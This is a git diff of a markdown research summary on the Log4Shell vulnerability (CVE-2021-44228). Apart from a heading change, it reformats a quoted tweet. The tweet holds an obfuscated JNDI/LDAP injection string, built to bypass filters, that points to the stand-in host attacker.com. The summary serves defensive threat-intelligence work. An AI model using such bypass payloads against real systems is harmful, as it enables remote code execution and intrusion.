@@ -1,4 +1,4 @@
-# CVE-2021-44228, log4j / log4shell Security Research Summary
+## CVE-2021-44228, log4j / log4shell Security Research Summary
 
 ### Threat Intel
 | URL | Info |
@@ -46,8 +46,9 @@
 https://twitter.com/Rezn0k/status/1469523006015750146?s=09
 If you're filtering on "ldap", "jndi", or the ${lower:x} method, I have bad news for you: 
 ```c
-${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a} This gets past every filter I've found so far. There's no shortage of these bypasses.
+${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}
 ```
+// attacker.com/a} This gets past every filter I've found so far. There's no shortage of these bypasses.
 
 https://twitter.com/ymzkei5/status/1469765165348704256?s=09
 There may be many ways to avoid detection :_(
